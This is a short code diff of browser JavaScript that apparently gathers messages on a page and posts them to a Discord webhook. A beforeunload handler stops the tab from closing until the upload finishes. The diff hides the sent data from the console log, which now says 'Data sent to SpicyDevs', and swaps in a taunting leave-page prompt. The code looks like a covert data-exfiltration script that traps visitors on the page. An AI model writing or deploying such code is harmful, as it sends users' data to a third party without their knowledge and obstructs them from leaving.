@@ -56,7 +56,7 @@
       const sendMergedMessages = async () => {
         const mergedData = mergedMessages.join('\n'); // Merge the messages using a separator
         await sendDataToWebhook(mergedData); // Send the merged messages to the webhook
-        console.log('Data sent to Discord webhook:', mergedData);
+        console.log('Data sent to SpicyDevs');
         mergedMessages = []; // Reset the mergedMessages array
       };
 
@@ -68,7 +68,7 @@
         if (!tabClosing && mergedMessages.length > 0) {
           tabClosing = true;
           event.preventDefault();
-          event.returnValue = ''; // Show the default browser prompt message
+          event.returnValue = 'You cannot quit so soon baby!'; // Show the default browser prompt message
           await sendMergedMessages(); // Send the accumulated messages
         }
       });
